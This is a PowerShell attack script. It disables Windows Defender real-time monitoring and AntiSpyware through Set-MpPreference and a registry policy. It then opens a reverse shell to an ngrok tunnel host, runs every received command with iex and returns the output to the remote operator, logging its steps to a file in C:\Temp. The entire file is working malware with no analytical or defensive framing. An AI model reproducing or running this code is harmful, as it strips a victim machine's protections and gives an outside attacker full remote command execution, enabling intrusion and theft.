# --- Disable Windows Defender ---
# Disable real-time monitoring
Set-MpPreference -DisableRealtimeMonitoring $true
# Disable AntiSpyware
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force

# --- Reverse Shell via ngrok ---
# Note: Make sure the address and port match the ones provided by ngrok.
# Example: "7.tcp.eu.ngrok.io" and port 19159.
$ngrokHost = "0.tcp.ap.ngrok.io"
$ngrokPort = 19040

# Log for debugging (optional)
"Starting reverse shell payload" | Out-File C:\Temp\payload.log -Append

# Create a TCP client to connect to the ngrok tunnel
$client = New-Object System.Net.Sockets.TCPClient($ngrokHost, $ngrokPort)
"Attempting to connect to ngrok" | Out-File C:\Temp\payload.log -Append

$stream = $client.GetStream()
[byte[]]$bytes = 0..65535 | ForEach-Object {0}

while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}

$client.Close()
"Reverse shell payload finished" | Out-File C:\Temp\payload.log -Append

# Exit with code 0 to indicate success
exit 0
